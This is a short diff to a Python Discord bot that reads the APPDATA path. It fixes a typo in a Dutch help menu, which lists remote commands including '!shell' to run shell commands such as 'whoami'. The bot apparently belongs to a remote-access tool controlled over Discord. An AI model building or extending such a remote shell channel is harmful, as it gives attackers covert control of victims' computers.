@@ -20,7 +20,7 @@ appdata = os.getenv('APPDATA')
 client = discord.Client()
 bot = commands.Bot(command_prefix='!')
 helpmenu = """
-Lijst me commands:
+Lijst met commands:
 
 --> !message = Toon een berichtvenster met  tekst/ Syntaxis = "!message example"
 --> !shell = Voer een shell-opdracht uit   = "!shell whoami"
